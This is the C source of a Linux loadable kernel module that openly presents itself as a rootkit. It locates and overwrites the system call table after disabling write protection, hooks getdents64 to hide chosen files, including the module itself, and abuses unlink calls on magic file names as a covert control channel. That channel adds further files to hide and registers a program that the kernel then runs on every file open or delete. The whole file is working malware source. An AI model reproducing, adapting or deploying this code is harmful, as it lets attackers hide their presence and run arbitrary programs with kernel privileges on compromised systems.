#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h> 
#include <linux/vmalloc.h>

/*************** Module description ********************/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Xincheng Yang");
MODULE_DESCRIPTION("Rootkit main entry"); 

/*************** Methods declaration ********************/
// Hook system call table and hide file by name
static unsigned long **hook_syscall_table(void);
static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
static int callMonitor(char *msg);

// Kernel system call
asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
asmlinkage long (*kernel_open)(const char __user *filename, int flags, umode_t mode);
asmlinkage long (*kernel_unlink)(const char __user *pathname);

// Hooked system call
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode);
asmlinkage long hooked_unlink(const char __user *pathname);

/*************** What file we gonna hide ********************/
char *INEXISTFILE = "HIDEAFILEINKERNEL";
char *INEXISTMONITOR = "SETMONITORPROGRAM";
char *hidfiles[256];
char *monitor = NULL;
int filenum;

/*
 * Disable write protection for hook system call table
 */
#define DISABLE_WRITE_PROTECTION (write_cr0(read_cr0() & (~ 0x10000)))
#define ENABLE_WRITE_PROTECTION (write_cr0(read_cr0() | 0x10000))
asmlinkage unsigned long **syscall_table;
 
static int lkm_init(void)
{
    printk("Hello world, our rootkit(hide a file) module successfully loaded\n");
    syscall_table = hook_syscall_table();
    
    DISABLE_WRITE_PROTECTION;
    kernel_getdents64 = (void *)syscall_table[__NR_getdents64]; 
    kernel_open = (void *)syscall_table[__NR_open]; 
    kernel_unlink = (void *)syscall_table[__NR_unlink]; 
    syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
    syscall_table[__NR_open] = (unsigned long *)hooked_open;
    syscall_table[__NR_unlink] = (unsigned long *)hooked_unlink;
    ENABLE_WRITE_PROTECTION;
    
    hidfiles[0] = "cmdoutput.txttmp";
    hidfiles[1] = "myrootkit.ko";
    hidfiles[2] = "ccprogram";
    filenum=3;
    
    return 0;    
}

/**
 * @brief This is the function to hook system call table
 * Before replace the original system call, we need to disable the system call table write protection.
 * @return the entry(array) of system call table
 */
unsigned long ** hook_syscall_table(void)
{
    unsigned long **entry = (unsigned long **)PAGE_OFFSET;

    for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
        if (entry[__NR_close] == (unsigned long *)sys_close) {
            return entry;
        }
    }

    return NULL;
}

/**
 * @brief Hide a specified file use linux_dirent
 * @param f_name : the file we want to hide 
 * @param dirp : the structure dirent which point to a specified file(inode) 
 * @param count : the size of this structure
 * @return 
 */
static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count)
{
    struct linux_dirent64 *dp;
    long cur_addr, cur_reclen, next_addr;
    
    for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
        dp = (struct linux_dirent64 *)((char *)dirp + cur_addr);
        
        if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
            printk("Hide %s file success.\n", dp->d_name);
            
            cur_reclen = dp->d_reclen;                              // Store the current dirent length
            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
            
            memmove(dp, (void *)next_addr, (unsigned long)dirp + count - next_addr); 
            count -= cur_reclen;                                    // Modify the count
        }
    }

    return count;
}

/**
 * @brief A hooked getdents64 for hide the file from filesystem
 * @param fd
 * @param count
 * @return 
 */
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
    long rv;
    int i;
    
    rv = kernel_getdents64(fd, dirp, count);
    for(i=0; i<filenum; i++){
        rv = hide_file64(hidfiles[i], dirp, rv);
    }
    
    return rv;
}

asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode){
    if(monitor != NULL){
        callMonitor(filename);
    }
        
    //Monitor exist file    
    return kernel_open(filename, flags, mode);
}

asmlinkage long hooked_unlink(const char __user *filename){
    int i, j;
    char *value;
    
    //Hide a new type of file
    if(strncmp(filename, INEXISTFILE, strlen(INEXISTFILE)) == 0){
        value = (char*) vmalloc(strlen(INEXISTFILE) * sizeof(char*));
        for(i=0, j=-1; i<strlen(filename); i++){
            if(j>-1){
                value[j] = filename[i];
                j++;
            } else if(filename[i] == '%'){
                j=0;
            }
        }
        if(j>0){
            value[j] = '\0';
            hidfiles[filenum] = value;
            filenum++;
        }
        printk("hide %s\n", value);
    } else if(strncmp(filename, INEXISTMONITOR, strlen(INEXISTMONITOR)) == 0){
        value = (char*) vmalloc(strlen(INEXISTMONITOR) * sizeof(char*));
        for(i=0, j=-1; i<strlen(filename); i++){
            if(j>-1){
                value[j] = filename[i];
                j++;
            } else if(filename[i] == '%'){
                j=0;
            }
        }
        if(j>0){
            value[j] = '\0';
            monitor = value;
        }
    }
    if(monitor != NULL){
        callMonitor(filename);
    }
    return kernel_unlink(filename);
}
 
static void lkm_exit(void)
{
    printk("Hello world, our rootkit module removed\n");
    
    // Recover the original system call setting
    DISABLE_WRITE_PROTECTION;
    syscall_table[__NR_getdents64] = (unsigned long *)kernel_getdents64;
    syscall_table[__NR_open] = (unsigned long *)kernel_open;
    syscall_table[__NR_unlink] = (unsigned long *)kernel_unlink;
    ENABLE_WRITE_PROTECTION;
}

static int callMonitor(char *msg){
    char *argv[] = { monitor, msg, NULL};
    static char *envp[] = {
            "HOME=/",
            "TERM=linux",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin:", NULL};

    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
 
module_init(lkm_init);
module_exit(lkm_exit);